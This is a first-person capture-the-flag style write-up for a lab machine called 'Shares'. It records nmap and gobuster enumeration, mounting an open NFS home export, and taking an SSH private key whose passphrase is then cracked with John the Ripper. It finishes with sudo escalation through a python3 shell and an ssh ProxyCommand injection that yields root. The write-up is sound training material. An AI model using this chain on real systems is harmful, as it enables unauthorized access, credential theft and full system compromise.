# Shares

## Information Gathering
Shares<br>
172.31.1.7<br>

## Enumeration
Start off with your nmap scan:
```bash
# Nmap 7.92 scan initiated Sun Feb 20 18:31:06 2022 as: nmap -p- -A -oN nmap/all_ports.nmap 172.31.1.7
Nmap scan report for 172.31.1.7
Host is up (0.049s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Pet Shop
|_http-server-header: Apache/2.4.29 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33845/tcp6  mountd
|   100005  1,2,3      36497/tcp   mountd
|   100005  1,2,3      36644/udp   mountd
|   100005  1,2,3      54201/udp6  mountd
|   100021  1,3,4      35149/tcp   nlockmgr
|   100021  1,3,4      40206/udp6  nlockmgr
|   100021  1,3,4      43809/tcp6  nlockmgr
|   100021  1,3,4      45094/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
27853/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)
|_  256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)
35149/tcp open  nlockmgr 1-4 (RPC #100021)
36497/tcp open  mountd   1-3 (RPC #100005)
38135/tcp open  mountd   1-3 (RPC #100005)
51705/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 20 18:31:38 2022 -- 1 IP address (1 host up) scanned in 31.72 seconds

```
There is a webserver so I run Gobuster against it:
```bash
/contact.html         (Status: 200) [Size: 5433]
/images               (Status: 301) [Size: 309] [--> http://172.31.1.7/images/]
/index.html           (Status: 200) [Size: 6338]
/blog.html            (Status: 200) [Size: 7654]
/about.html           (Status: 200) [Size: 8795]
/css                  (Status: 301) [Size: 306] [--> http://172.31.1.7/css/]
/fonts                (Status: 301) [Size: 308] [--> http://172.31.1.7/fonts/]
/server-status        (Status: 403) [Size: 275]

```
Nothing too interesting...<br>
I check out the nfs service and see if I can mount any directories to my local machine.
```bash
showmount -e 172.31.1.7
Export list for 172.31.1.7:
/home/amir *.*.*.*
```
## Exploitation
Because anyone can mount /home/amir to their local machine, I go ahead and mount it:
```bash
sudo mount -o rw 172.31.1.7:/home/amir /mnt/nfs_amir
```
I'm able to successfully mount this directory.<br>
Next I take a look around and see that amir has id_rsa ssh keys. Copying them and trying to ssh in using them shows that a passphrase is required.
```bash
chmod 600 id_rsa
ssh -i id_rsa amir@172.31.1.7 -p 27853
Enter passphrase for key 'id_rsa':
```
After a few guesses, nothing comes up. Fortunatly, JohnTheRipper comes with a tool to crack ssh passphrases. I use ssh2john.py to create a format that John can recognize, and start cracking
```bash
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
I get back <b>"hello6"</b> as the passpharse. This gives me foothold onto the box.

## Privilege Escalation
Start with some basic enumeration:
```bash
sudo -l
Matching Defaults entries for amir on shares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amir may run the following commands on shares:
    (ALL : ALL) ALL
    (amy) NOPASSWD: /usr/bin/pkexec
    (amy) NOPASSWD: /usr/bin/python3
```
We can execute two applications as amy with no password. Using pkexec prompts you with a password. Using python3 allows you to pivot over to amy.
```bash
sudo -u amy python3 -c 'import os; os.system("/bin/bash")'
amy@shares:~$ id
uid=1001(amy) gid=1001(amy) groups=1001(amy)
```
I do the same thing for amy...
```bash
sudo -l
Matching Defaults entries for amy on shares:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User amy may run the following commands on shares:
    (ALL) NOPASSWD: /usr/bin/ssh
```
I can run ssh as sudo without a password. Lovely. The privilege escaltion for this is show in <a href="https://gtfobins.github.io/">GTFOBins</a>
```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
root@shares:~# id
uid=0(root) gid=0(root) groups=0(root)
```
This gives you root.